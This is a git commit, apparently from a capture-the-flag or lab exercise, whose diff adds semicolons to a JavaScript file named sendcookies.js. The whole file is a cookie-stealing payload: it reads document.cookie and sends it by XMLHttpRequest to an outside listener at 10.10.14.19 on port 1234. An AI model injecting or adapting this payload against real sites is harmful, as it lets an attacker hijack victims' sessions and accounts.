ae9b5dde10404217774e3de7e54d65af52b6932f
Parchaks <parchaks@protonmail.com>
2022-12-30 11:57:36 -0900

    "fixing syntax"

--- sendcookies.js
+++ sendcookies.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://10.10.14.19:1234' + document.cookie, true)
-xhttp.send()
+xhttp.open('GET', 'http://10.10.14.19:1234' + document.cookie, true);
+xhttp.send();
